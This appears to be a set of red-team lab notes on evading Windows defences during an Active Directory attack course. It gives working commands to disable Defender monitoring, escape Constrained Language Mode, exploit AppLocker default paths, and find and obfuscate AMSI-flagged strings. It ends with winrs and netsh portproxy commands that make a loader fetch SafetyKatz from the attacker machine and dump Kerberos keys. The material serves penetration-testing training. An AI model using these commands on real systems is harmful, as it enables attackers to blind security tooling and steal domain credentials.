## Bypass ScriptBlock logging, Module logging, Transcription and AMSI using invisi-shell

The usage is provided in the repository itself.
```
https://github.com/OmerYa/Invisi-Shell 
```
## Simply disable AV on machine if we have administrative access
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
## Bypass Constrained Language Mode in powershell when we have administrator access
When PowerShell is in Constrained Language Mode, it enforces a set of language constraints that limit access to certain sensitive system resources and prevent potentially harmful operations. These constraints aim to mitigate risks associated with malicious or unintentional script behavior, reducing the potential impact of any security vulnerabilities or code execution exploits. Simply it only allows good code to run but if we have administrative access we can set session state to full language.
- Note: Constrained Language mode can also be set defaultly due to applocker and wdat policies in such case the below won't work so see applocker bypass. 
```
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
```
## AppLocker Bypass
AppLocker has some default rules that makes applocker useless for example it allows everyone to run scripts that are located in Program Files or Windows directory and if we have administrative access we can simply put those scripts in those directory and run them. 
- First check the applocker policy using below command
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
- If we see for example PathConditions set to {%PROGRAMFILES%\*} or {%WINDIR%\*} it means the scripts can be run from those directory.

## Bypass signature based detections of powershell scripts by windows defender
Using https://github.com/RythmStick/AMSITrigger we can identify exact part of the script that is detected 
```
AmsiTrigger_x64.exe -i C:\Tools\Invoke-TcpOneLIner.ps1
```

## DefenderCheck to identify code/strings from binary or other file(ps1) that windows defender may flag
- https://github.com/t3hbb/DefenderCheck
```
DefenderCheck.exe PowerUp.ps1
```

## Obfscuating powershell scripts
Can be used to obfscuate AMSI-Bypasses from amsi.fail, maybe obfscuating invisi-shell, powerview, etc.
- https://github.com/danielbohannon/Invoke-Obfuscation

Note:
- You can use AMSITrigger and DefenderCheck to identify exact part where defender flags.
- Identify exact string using trial and error where it is flagging
- Modify that part/string using chatgpt
- Maybe also obfscuate that part only?

For example the identified string was System.AppDomain in the following code of PowerUp.

```
# Code ......
	$AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
# Code.........
```
Here, the System.AppDomain can be reversed and referenced as a variable like this

```
$originalString = "niamoDppA.metsyS"
$reversedString = [char[]]$originalString -join ""
$reversedString = -join ($reversedString[$reversedString.Length..0])
$AppDomain = [Reflection.Assembly].Assembly.GetType("$reversedString").GetProperty('CurrentDomain').GetValue($null, @())
```
then check again with AmsiTrigger or DefenderCheck.

## Steps for bypassing offensive executables
- Use DefenderCheck and identify excat string getting flagged by trial and error method
- Find the open source project for that tool in github most are in c#
- open the project in visual studio
- press ctrl+H
- Find and replace the string identified by DefenderCheck 
- Select the scope as "Entire solution"
- Press "Replace All" button
- Build and ReCheck the binary with DefenderCheck
- Repeat above steps

# Port forward to bypass behaviour based detection
- executes port forward command on dcorp-mgmt machine where anything that is sent via 172.16.100.1 student machine's port 80 is forwarded to dcorp-mgmt's loopback address via port 8080 and anything that is sent through loopback 0.0.0.0 port 8080 is forwarded to 172.16.100.1's port 80 which is the student vm respectively.
```$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1```

- Host Loader.exe via HFS on student vm and here using winrs on dcorp-mgmt machine Loader.exe will load safetykatz from http://127.0.0.1:8080/SafetyKatz.exe since port forwarding was done that anything that is sent through loopback 0.0.0.0 port 8080 is forwarded to 172.16.100.1's port 80 which is the student vm in this case  
```$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit```